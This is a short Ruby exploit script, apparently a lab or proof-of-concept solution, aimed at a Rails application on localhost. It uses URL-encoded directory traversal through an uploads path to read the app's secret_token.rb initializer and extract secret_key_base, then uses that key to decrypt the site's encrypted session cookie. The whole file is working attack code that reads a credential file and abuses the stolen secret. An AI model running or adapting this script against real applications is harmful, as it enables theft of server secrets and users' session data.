require 'active_support'
require 'mechanize'
require 'base64'

def decrypt_session_cookie(cookie, secret_key_base)
  cookie = CGI.unescape(cookie)

  # Assume default values
  encrypted_cookie_salt        = "encrypted cookie" 
  encrypted_signed_cookie_salt = "signed encrypted cookie"

  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
  secret        = key_generator.generate_key(encrypted_cookie_salt)
  sign_secret   = key_generator.generate_key(encrypted_signed_cookie_salt)

  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret)
  encryptor.decrypt_and_verify(cookie)
end

Mechanize.new.instance_eval do
  # Retrieve the secret key base through directory traversal
  puts '[+] Retrieving secret key base'
  get 'http://localhost:3000/uploads/%2E%2E%2Fconfig%2Finitializers%2Fsecret_token.rb'

  secret_key_base = page.body.match(/secret_key_base = '(.*)'/)
                      .captures
                      .first
  
  # Retrieve the session cookie  
  puts '[+] Retrieving session cookie'                    
  get '/'
  cookie = cookie_jar.cookies.first.value


  # Decrypt the session cookie
  cleartext_cookie = decrypt_session_cookie(cookie, secret_key_base)
  puts '[+] Success'
  puts cleartext_cookie
end
